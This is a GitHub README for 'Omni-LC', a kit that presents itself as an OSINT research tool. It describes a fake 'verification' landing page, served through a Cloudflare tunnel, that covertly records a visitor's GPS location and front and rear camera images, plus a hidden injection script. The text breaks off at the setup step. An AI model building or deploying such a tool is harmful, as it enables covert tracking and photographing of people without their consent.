
# Omni-LC (Location & Camera OSINT Tool) 🛰️📸

**Omni-LC** is a specialized OSINT (Open-Source Intelligence) and security research tool designed to demonstrate automated geolocation tracking and synchronized camera image capture. It features a robust backend for data management and a modern, encrypted dashboard for real-time monitoring.

---

## 🚀 Features
* **Precision Geolocation:** Captures real-time GPS coordinates (Latitude/Longitude).
* **Dual-Camera Capture:** Automated front and rear camera image acquisition.
* **Secure Dashboard:** A centralized PHP-based dashboard to view logs and images.
* **Stealth Execution:** Optimized for minimal footprint during data synchronization.
* **Cloudflare Integration:** Built-in support for secure tunneling using `cloudflared`.

---

## 🛠️ Project Structure
* `index.html`: The core landing page (Verification system).
* `.engine.py`: The injection engine for system updates.
* `core/`: Contains the logic for location (`locate.php`) and image uploads (`upload.php`).
* `logs/`: Secure storage for captured data and images.
* `run.sh`: Automated script to start the PHP server and Cloudflare tunnel.

---

## 📥 Installation & Setup

1. **Clone the repository:**
   ```bash
   git clone [https://github.com/ANK-369/Omni-LC.git](https://github.com/ANK-369/Omni-LC.git)
   cd Omni-LC
